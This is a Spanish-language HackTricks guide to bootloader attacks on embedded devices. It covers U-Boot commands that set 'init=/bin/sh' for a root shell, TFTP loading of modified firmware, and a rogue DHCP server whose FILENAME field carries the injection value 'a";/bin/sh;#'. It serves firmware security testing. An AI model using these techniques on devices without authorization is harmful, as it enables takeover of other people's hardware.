<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Los siguientes pasos se recomiendan para modificar las configuraciones de inicio del dispositivo y los bootloaders como U-boot:

1. **Acceder a la Shell del Intérprete del Bootloader**:
- Durante el arranque, presiona "0", espacio u otros "códigos mágicos" identificados para acceder a la shell del intérprete del bootloader.

2. **Modificar los Argumentos de Arranque**:
- Ejecuta los siguientes comandos para agregar '`init=/bin/sh`' a los argumentos de arranque, permitiendo la ejecución de un comando de shell:
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **Configurar un Servidor TFTP**:
- Configura un servidor TFTP para cargar imágenes a través de una red local:
%%%
#setenv ipaddr 192.168.2.2 #IP local del dispositivo
#setenv serverip 192.168.2.1 #IP del servidor TFTP
#saveenv
#reset
#ping 192.168.2.1 #verificar acceso a la red
#tftp ${loadaddr} uImage-3.6.35 #loadaddr toma la dirección para cargar el archivo y el nombre del archivo de la imagen en el servidor TFTP
%%%

4. **Utilizar `ubootwrite.py`**:
- Usa `ubootwrite.py` para escribir la imagen de U-boot y cargar un firmware modificado para obtener acceso de root.

5. **Verificar las Características de Depuración**:
- Verifica si las características de depuración como el registro detallado, la carga de kernels arbitrarios o el arranque desde fuentes no confiables están habilitadas.

6. **Interferencia de Hardware con Precaución**:
- Ten precaución al conectar un pin a tierra e interactuar con chips de memoria flash SPI o NAND durante la secuencia de arranque del dispositivo, especialmente antes de que el kernel se descomprima. Consulta la hoja de datos del chip de memoria NAND antes de hacer cortocircuitos en los pines.

7. **Configurar un Servidor DHCP Malicioso**:
- Configura un servidor DHCP malicioso con parámetros maliciosos para que un dispositivo los ingiera durante un arranque PXE. Utiliza herramientas como el servidor auxiliar DHCP de Metasploit (MSF). Modifica el parámetro 'FILENAME' con comandos de inyección de comandos como `'a";/bin/sh;#'` para probar la validación de entrada en los procedimientos de inicio del dispositivo.

**Nota**: Los pasos que implican interacción física con los pines del dispositivo (*marcados con asteriscos) deben abordarse con extrema precaución para evitar dañar el dispositivo.


## Referencias
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
